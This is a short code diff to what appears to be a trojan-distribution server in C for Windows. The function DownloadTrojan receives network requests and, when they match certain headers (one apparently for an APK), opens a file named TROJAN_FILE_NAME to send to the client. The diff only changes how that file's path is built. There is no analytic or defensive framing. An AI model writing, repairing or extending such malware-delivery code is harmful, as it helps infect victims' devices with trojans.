@@ -10,6 +10,9 @@ DWORD __stdcall DownloadTrojan(LPNETWORKPROCPARAM lpparam) {
 	char lpdata[0x1000] = { 0 };
 	char szsendbuf[0x1000];
 
+	char szCurrentDir[MAX_PATH];
+	GetCurrentDirectoryA(MAX_PATH, szCurrentDir);
+
 	try {
 
 		int dwPackSize = recv(stparam.hSockClient, lpdata, 0x1000, 0);
@@ -154,7 +157,7 @@ DWORD __stdcall DownloadTrojan(LPNETWORKPROCPARAM lpparam) {
 		else if (memcmp(lpdata, szgetapk, lstrlenA(szgetapk)) == 0)
 		{
 			char szTrojanPath[MAX_PATH];
-			lstrcpyA(szTrojanPath, stparam.szCurrentPath);
+			lstrcpyA(szTrojanPath, szCurrentDir);
 			lstrcatA(szTrojanPath, "\\");
 			lstrcatA(szTrojanPath, TROJAN_FILE_NAME);
 			HANDLE hFile = CreateFileA(szTrojanPath, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
@@ -196,7 +199,7 @@ DWORD __stdcall DownloadTrojan(LPNETWORKPROCPARAM lpparam) {
 			if (memcmp(lpdata, szheadurl, lstrlenA(szheadurl)) == 0)
 			{
 				char szTrojanPath[MAX_PATH];
-				lstrcpyA(szTrojanPath, stparam.szCurrentPath);
+				lstrcpyA(szTrojanPath, szCurrentDir);
 				lstrcatA(szTrojanPath, "\\");
 				lstrcatA(szTrojanPath, TROJAN_FILE_NAME);
 				hFile = CreateFileA(szTrojanPath, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
